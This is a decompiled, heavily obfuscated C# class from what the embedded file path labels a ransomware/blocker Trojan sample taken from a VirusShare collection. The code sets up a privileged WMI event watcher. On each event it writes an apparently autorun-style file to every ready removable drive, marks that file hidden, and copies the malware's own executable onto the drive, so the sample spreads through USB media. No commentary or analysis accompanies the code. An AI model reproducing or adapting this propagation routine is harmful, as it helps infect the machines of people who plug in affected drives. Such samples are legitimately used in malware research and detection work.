// Decompiled with JetBrains decompiler
// Type: M6-n. i>O._@E<(!.$;:.
// Assembly: ]\r, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 954C3D5E-708C-4DD0-82B7-DE2C5BD9F148
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b8539742a30b177b50768aa3e2c5af8a1f70cde6bd248fc157300ef1b9642f75.exe

using M\u000E6\u002Dn\u0008;
using M\u000E6\u002Dn\u0008.\u0020\u001A\u000F\u000Bi\u003E\u001BO.\u0083_\u0040E\u003C\u0028\u0021;
using System;
using System.IO;
using System.Management;

namespace M\u000E6\u002Dn\u0008.\u0020\u001A\u000F\u000Bi\u003E\u001BO.\u0083_\u0040E\u003C\u0028\u0021
{
  internal class \u0024\u003B\u003A\u0015\u002E
  {
    private static ManagementEventWatcher \u005D\u0013\u0016EZ\u0019B\u0021;

    public static void QX\u0023\u0027A\u0011()
    {
      try
      {
        ManagementScope scope = new ManagementScope(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.X\u001C\u0012Wc\u001F\u003F\u0001V());
        scope.Options.EnablePrivileges = true;
        WqlEventQuery query = new WqlEventQuery()
        {
          EventClassName = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.P\u00093\u002B\u0006\u0003(),
          WithinInterval = new TimeSpan(0, 0, 1),
          Condition = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.g\u0009SNp\u001E()
        };
        \u0024\u003B\u003A\u0015\u002E.\u005D\u0013\u0016EZ\u0019B\u0021 = new ManagementEventWatcher(scope, (EventQuery) query);
        \u0024\u003B\u003A\u0015\u002E.\u005D\u0013\u0016EZ\u0019B\u0021.EventArrived += new EventArrivedEventHandler(\u0024\u003B\u003A\u0015\u002E.\u0015\u0086\u000B\u0003\u0024\u0086Q);
        \u0024\u003B\u003A\u0015\u002E.\u005D\u0013\u0016EZ\u0019B\u0021.Start();
      }
      catch
      {
      }
    }

    public static void _WB\u000C\u0004()
    {
      try
      {
        \u0024\u003B\u003A\u0015\u002E.\u005D\u0013\u0016EZ\u0019B\u0021.Stop();
      }
      catch
      {
      }
    }

    private static void \u0015\u0086\u000B\u0003\u0024\u0086Q(
      object _param0,
      EventArrivedEventArgs _param1)
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
        {
          if (drive.DriveType == DriveType.Removable)
          {
            try
            {
              string[] strArray = new string[2]
              {
                drive.Name + \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0015\u003A\u000C\u0028\u0007\u00162(),
                drive.Name + \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.jv()
              };
              foreach (string path in strArray)
              {
                if (File.Exists(path))
                  File.Delete(path);
              }
              using (StreamWriter streamWriter = new StreamWriter((Stream) new FileStream(strArray[0], FileMode.Create, FileAccess.Write)))
              {
                streamWriter.Write(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u001CS3\u007D\u0022Q());
                streamWriter.Write(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.W\u0005\u0018());
                streamWriter.Write(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u000FQ\u003D\u0003\u0085\u008D\u0014\u00275());
                streamWriter.Write(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.C\u0022\u000C\u0024\u000AZ\u0022y());
                streamWriter.Write(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0018\u0020\u0023\u0008());
                streamWriter.Flush();
                streamWriter.Close();
              }
              File.Copy(m\u003D\u000D.\u001A\u002B\u001B\u0021\u0026NA, strArray[1], true);
              File.SetAttributes(strArray[0], File.GetAttributes(strArray[0]) | FileAttributes.Hidden);
              File.SetAttributes(strArray[1], FileAttributes.Archive | FileAttributes.Normal);
            }
            catch
            {
            }
          }
        }
      }
    }
  }
}
